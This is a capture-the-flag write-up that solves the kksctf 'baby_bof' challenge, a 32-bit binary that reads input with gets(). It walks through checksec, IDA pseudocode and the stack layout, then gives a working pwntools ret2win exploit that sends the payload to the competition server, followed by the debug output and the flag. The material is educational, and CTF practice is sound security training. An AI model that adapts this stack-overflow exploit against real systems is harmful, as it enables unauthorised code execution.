As the title said, this is a simple buffer overflow chall. It is friendly to
beginners just like me, we were given a file named "baby_bof".

First check the file:

```bash  
(pwn) pwn@ubuntu:~/Documents/kksctf$ file baby_bof  
baby_bof: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV),
dynamically linked, interpreter /lib/ld-, for GNU/Linux 3.2.0,
BuildID[sha1]=679ffb807feb7aef6982de068fe64bb6deb7fb0c, not stripped  
(pwn) pwn@ubuntu:~/Documents/kksctf$ checksec baby_bof  
[*] '/home/pwn/Documents/kksctf/baby_bof'  
   Arch:     i386-32-little  
   RELRO:    Partial RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x8048000)  
(pwn) pwn@ubuntu:~/Documents/kksctf$ ./baby_bof  
We have prepared a buffer overflow for you  
Can you get use of it?  
Enter your name: hahaha?  
Hello, hahaha?!  
(pwn) pwn@ubuntu:~/Documents/kksctf$  
```

So open it with IDA32 and press "F5", we could see the main function's
Pseudocode:

```c  
int __cdecl main(int argc, const char **argv, const char **envp)  
{  
 char s; // [esp+0h] [ebp-100h]

 setbuf(stdin, 0);  
 setbuf(stdout, 0);  
 setbuf(stderr, 0);  
 puts("We have prepared a buffer overflow for you");  
 puts("Can you get use of it?");  
 printf("Enter your name: ");  
 read_wrapper(&s);  
 printf("Hello, %s!\n", &s);  
 return 0;  
}  
```

The program will ask your name to input, in function read_wrapper, it will use
`gets` function to set the `s`'s value to our input:

```c  
unsigned int __cdecl read_wrapper(char *s)  
{  
 size_t v1; // edx  
 unsigned int result; // eax  
 unsigned int i; // [esp+0h] [ebp-8h]

 gets(s);  
 for ( i = 0; ; ++i )  
 {  
   v1 = strlen(s);  
   result = i;  
   if ( v1 <= i )  
     break;  
   if ( s[i] > '@' && s[i] <= 'Z' )  
     s[i] += 0x20;  
 }  
 return result;  
}  
```

According to this, there is no length limitation for `s`. And `s`'s address is
"ebp-100h", so we can input data like `a*0x100 + b*0x4 + jmp_addr` to
overwrite the return address, and we also can see this in IDA's Stack Window.

```  
-00000100 ; D/A/*   : change type (data/ascii/array)  
-00000100 ; N       : rename  
-00000100 ; U       : undefine  
-00000100 ; Use data definition commands to create local variables and function arguments.  
-00000100 ; Two special fields " r" and " s" represent return address and saved registers.  
-00000100 ; Frame size: 100; Saved regs: 4; Purge: 0  
-00000100 ;  
-00000100  
-00000100 s               db ?  
-000000FF                 db ? ; undefined  
......  
-00000003                 db ? ; undefined  
-00000002                 db ? ; undefined  
-00000001                 db ? ; undefined  
+00000000  s              db 4 dup(?)  
+00000004  r              db 4 dup(?)  
+00000008 argc            dd ?  
+0000000C argv            dd ?                    ; offset  
+00000010 envp            dd ?                    ; offset  
+00000014  
+00000014 ; end of stack variables  
```

Another point is that we should find the `jmp_addr`, usually  we should make
it as the `system("/bin/sh");`,  but in this chall, we can find a function
named `win()`:

```c  
int __cdecl win(int a1)  
{  
 char s; // [esp+3h] [ebp-25h]  
 FILE *stream; // [esp+20h] [ebp-8h]

 stream = fopen("flag.txt", (const char *)&unk_8048830);// 'r'  
 if ( !stream )  
   return puts("flag not found");  
 fgets(&s, 29, stream);  
 if ( a1 != 0xCAFEBABE )  
 {  
   puts("Almost there :)");  
   exit(0);  
 }  
 return printf("Here it comes: %s\n", &s);  
}  
```

We could see this function will open current working directory's file
"flag.txt", and check the argument "a1", if "a1" equal to 0xCAFEBABE, then
print the file contents, that's flag.

We know that it should firstly push arguments to stack before normally calling
a normal function, and call instruction will push the next instruction
address, then the data we input will increase in stack, so the data we should
construct is `a*0x100 + b*0x4 + win_addr + p32(0xcafebabe)`, as the IDA shows,
the win() function start address is 0x80485F6, so the last exploit is:

```python  
from pwn import *  
# for kksctf-baby_bof  
context.log_level = "debug"  
sh = remote("tasks.open.kksctf.ru", 10002)  
#sh = process("./baby_bof")  
#gdb.attach(sh)

win_addr = 0x80485f6

payload = "a"*0x100 + "b"*0x04 + p32(win_addr) + p32(0x804850c) +
p32(0xCAFEBABE) # p32(0x804850c) is the normal main() func return address  
sh.recvuntil("Enter your name: ")  
sh.sendline(payload)  
# pause() # to Debug  
sh.interactive() #the last line should have, to keep seeing flag.  
```

And run it in terminal:

```bash  
(pwn) pwn@ubuntu:~/Documents/kksctf$ python exp.py  
[+] Opening connection to tasks.open.kksctf.ru on port 10002: Done  
[DEBUG] Received 0x2a bytes:  
   'We have prepared a buffer overflow for you'  
[DEBUG] Received 0x29 bytes:  
   '\n'  
   'Can you get use of it?\n'  
   'Enter your name: '  
[DEBUG] Sent 0x111 bytes:  
   00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61
│aaaa│aaaa│aaaa│aaaa│  
   *  
   00000100  62 62 62 62  f6 85 04 08  0c 85 04 08  be ba fe ca
│bbbb│····│····│····│  
   00000110  0a                                                  │·│  
   00000111  
[*] Switching to interactive mode  
[DEBUG] Received 0x119 bytes:  
   00000000  48 65 6c 6c  6f 2c 20 61  61 61 61 61  61 61 61 61  │Hell│o,
a│aaaa│aaaa│  
   00000010  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61
│aaaa│aaaa│aaaa│aaaa│  
   *  
   00000100  61 61 61 61  61 61 61 62  62 62 62 f6  85 04 08 0c
│aaaa│aaab│bbb·│····│  
   00000110  85 04 08 be  ba fe ca 21  0a                        │····│···!│·│  
   00000119  
Hello,
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb��\x0c\x85\x0\xbe\xba\xfe�!  
[DEBUG] Received 0x7e bytes:  
   'Here it comes: kks{0v3rf10w_15_my_1!f3}\n'  
   '\n'  
   '/home/ctf/redir.sh: line 4:    74 Segmentation fault      timeout -k 120
120 ./chall\n'  
Here it comes: kks{0v3rf10w_15_my_1!f3}

/home/ctf/redir.sh: line 4:    74 Segmentation fault      timeout -k 120 120
./chall  
[*] Got EOF while reading in interactive  
$  
```

- **flag**: kks{0v3rf10w_15_my_1!f3}

Original writeup (https://spwpun.info/2019/12/30/kksctf-writeup/#Baby-buffer-
overflow).